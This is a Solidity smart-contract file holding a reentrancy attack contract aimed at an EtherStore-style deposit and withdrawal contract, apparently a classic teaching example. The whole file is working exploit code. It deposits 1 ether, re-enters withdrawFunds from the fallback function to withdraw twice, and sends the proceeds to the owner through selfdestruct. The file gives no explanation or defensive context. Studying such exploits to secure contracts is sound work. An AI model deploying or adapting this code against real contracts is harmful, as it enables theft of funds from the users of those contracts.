pragma solidity ^0.4.10;

interface IEtherStore {
    function depositFunds() external payable;
    function withdrawFunds(uint256 amount) external;
}

contract ReentrancyAttack {
    IEtherStore public etherStore;
    address public owner;
    uint256 public attackAmount = 1 ether;
    bool public reenter = true;

    constructor(address _etherStoreAddress) public {
        etherStore = IEtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= attackAmount);
        // Deposit initial amount
        etherStore.depositFunds.value(attackAmount)();
        // Start reentrant withdrawal
        etherStore.withdrawFunds(attackAmount);
    }

    // Fallback gets triggered on receive of ether
    function () public payable {
        if (reenter) {
            reenter = false; // Prevent infinite recursion
            etherStore.withdrawFunds(attackAmount);
        }
    }

    function collect() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

